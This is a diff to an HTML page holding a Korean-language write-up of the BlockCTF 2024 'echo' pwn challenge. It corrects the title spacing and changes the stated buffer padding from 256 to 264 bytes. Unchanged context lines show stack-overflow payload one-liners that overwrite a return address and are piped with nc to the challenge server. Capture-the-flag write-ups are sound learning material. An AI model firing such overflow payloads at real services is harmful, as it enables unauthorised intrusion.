@@ -4,7 +4,7 @@
         <link rel="stylesheet" type="text/css" href="sytle.css">
 </head>
 <body>
-        <h1>BlockCTF 2024 #Pwn echo Write-Up</h1>
+        <h1>Block CTF 2024 #Pwn echo Write-Up</h1>
 </body>
 <br>
 <br>
@@ -65,7 +65,7 @@ python3 -c 'print("A" * 256 + "\x76\x11\x40\x00")' | nc 54.85.45.101 8008
 
 뭐가 문제인지 잘 모르겠어서 구글링을 해보니 패딩을 늘려가면서 ```return address```에 도달하는 확인해 볼수 있다고 한다. 
 
-그래서 패딩을 256바이트로 늘려 시도해보았다.
+그래서 패딩을 264바이트로 늘려 시도해보았다.
 
 ```
 python -c 'print("A" * 264 + "\x76\x11\x40\x00\x00\x00\x00\x00")' | nc 54.85.45.101 8008
